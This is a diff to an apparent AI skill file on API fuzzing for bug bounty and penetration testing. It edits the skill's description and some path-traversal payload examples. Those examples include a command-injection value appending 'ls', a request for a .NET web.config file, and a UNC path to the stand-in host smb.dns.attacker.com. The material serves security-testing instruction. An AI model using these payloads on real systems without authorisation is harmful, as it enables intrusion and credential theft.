@@ -1,6 +1,6 @@
 ---
 name: api-fuzzing-bug-bounty
-description: "Provide comprehensive techniques for testing REST, SOAP, and GraphQL APIs during bug bounty hunting and penetration testing engagements. Covers vulnerability discovery, authentication bypass, IDOR exploitation, and API-specific attack vectors."
+description: Provide comprehensive techniques for testing REST, SOAP, and GraphQL APIs during bug bounty hunting and penetration testing engagements. Covers vulnerability discovery, authentication bypass, IDOR exploitation, and API-specific attack vectors. Use when the task involves api fuzzing bug bounty.
 risk: offensive
 source: community
 author: zebbern
@@ -155,8 +155,8 @@ api.url.com/endpoint?name=file.txt;ls%20/
 # If .NET app uses Path.Combine(path_1, path_2)
 # Test for path traversal
 https://example.org/download?filename=a.png
-https://example.org/download?filename=C:\inetpub\wwwroot\web.config
-https://example.org/download?filename=\\smb.dns.attacker.com\a.png
+https://example.org/download?filename=C:/inetpub/wwwroot/web.config
+https://example.org/download?filename=\\smb.dns.attacker.com/a.png
 ```
 
 ### Step 5: Method Testing
